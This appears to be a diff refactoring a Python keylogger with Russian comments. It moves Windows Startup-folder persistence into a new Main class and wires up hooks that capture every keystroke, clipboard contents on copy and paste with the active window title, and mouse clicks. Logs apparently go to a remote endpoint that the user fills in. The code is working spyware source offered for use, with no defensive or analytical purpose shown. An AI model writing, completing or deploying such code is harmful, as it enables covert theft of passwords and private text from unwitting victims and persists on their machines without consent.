@@ -15,19 +15,6 @@ import shutil
 
 
 
-# ==== AUTOSTARTUP ====
-if getattr(sys, 'frozen', False):
-    src_path = sys.executable
-else:
-    src_path = __file__
-script_name = os.path.basename(__file__)
-
-autostart_path = f"C:/Users/{getpass.getuser()}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
-if not os.path.exists(f"{autostart_path}/{script_name}"):
-    shutil.copy(src_path, autostart_path)
-
-
-
 # ==== SYMBOLS ====
 launguages = {
     0x0419: {  # Русская раскладка
@@ -37,24 +24,24 @@ launguages = {
         'd': 'в', 'f': 'а', 'g': 'п', 'h': 'р', 'j': 'о', 'k': 'л', 'l': 'д',
         ';': 'ж', "'": 'э', 'z': 'я', 'x': 'ч', 'c': 'с', 'v': 'м', 'b': 'и',
         'n': 'т', 'm': 'ь', ',': 'б', '.': 'ю', '/': '.',
-        
+
         # Верхний регистр (Shift + символ)
         'Q': 'Й', 'W': 'Ц', 'E': 'У', 'R': 'К', 'T': 'Е', 'Y': 'Н', 'U': 'Г',
         'I': 'Ш', 'O': 'Щ', 'P': 'З', '{': 'Х', '}': 'Ъ', 'A': 'Ф', 'S': 'Ы',
         'D': 'В', 'F': 'А', 'G': 'П', 'H': 'Р', 'J': 'О', 'K': 'Л', 'L': 'Д',
         ':': 'Ж', '"': 'Э', 'Z': 'Я', 'X': 'Ч', 'C': 'С', 'V': 'М', 'B': 'И',
         'N': 'Т', 'M': 'Ь', '<': 'Б', '>': 'Ю', '?': ',',
-        
+
         # Цифровой ряд БЕЗ Shift (русская раскладка)
         '1': '1', '2': '2', '3': '3', '4': '4', '5': '5',
         '6': '6', '7': '7', '8': '8', '9': '9', '0': '0',
         '-': '-', '=': '=',
-        
+
         # Цифровой ряд С Shift (русская раскладка)
         '!': '!', '@': '"', '#': '№', '$': ';', '%': '%',
         '^': ':', '&': '?', '*': '*', '(': '(', ')': ')',
         '_': '_', '+': '+',
-        
+
         # Специальные символы
         '`': 'ё', '~': 'Ё',
         '\\': '\\', '|': '/',
@@ -155,23 +142,49 @@ class KeyLPOST:
         except Exception as e: print(e)
 
 
+
+class Main:
+    def __init__(self, ip):
+        self.klgrr = KeyLPOST(ip)
+
+
+    def add_script_into_autostartup(self):
+        if getattr(sys, 'frozen', False):
+            src_path = sys.executable
+        else:
+            src_path = __file__
+        script_name = os.path.basename(__file__)
+
+        autostart_path = f"C:/Users/{getpass.getuser()}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
+        if not os.path.exists(f"{autostart_path}/{script_name}"):
+            shutil.copy(src_path, autostart_path)
+
+
     def main(self):
-        self.logging("Комп запущен")
+        self.add_script_into_autostartup()
+        self.init_listeners()
+        self.pool()
 
-        keyboard.hook(self.on_key_press)
-        keyboard.add_hotkey('ctrl+c', lambda: self.logging(f"[{self.ACTIVE_WINDOW}]: {pyperclip.paste()}"))
-        keyboard.add_hotkey('ctrl+v', lambda: self.logging(f"[{self.ACTIVE_WINDOW}]: {pyperclip.paste()}"))
-        mouse_listener = mouse.Listener(on_click=self.on_click)
-        mouse_listener.start()
 
+    def init_listeners(self):
+        keyboard.hook(self.klgrr.on_key_press)
+        keyboard.add_hotkey('ctrl+c', lambda: self.logging(f"[{self.klgrr.ACTIVE_WINDOW}]: {pyperclip.paste()}"))
+        keyboard.add_hotkey('ctrl+v', lambda: self.logging(f"[{self.klgrr.ACTIVE_WINDOW}]: {pyperclip.paste()}"))
+        self.mouse_listener = mouse.Listener(on_click=self.klgrr.on_click)
+        self.mouse_listener.start()
+        self.klgrr.logging("Компьютер запущен")
+
+
+    def pool(self):
         try:
             while True:
                 time.sleep(0.05)
         except Exception as e:
-            mouse_listener.stop()
-            self.logging(f"Комп завершил работу из-за не предвиденной ошибки: {e}")
+            self.mouse_listener.stop()
+            self.klgrr.logging(f"Компьютер завершил работу из-за не предвиденной ошибки: {e}")
 
 
 
 # ==== START ====
-KeyLPOST("http://127.0.0.1:5000").main() # Write endpoint IP or domain here
+if __name__=="__main__":
+    Main("http://127.0.0.1:5000").main() # Write endpoint IP or domain here
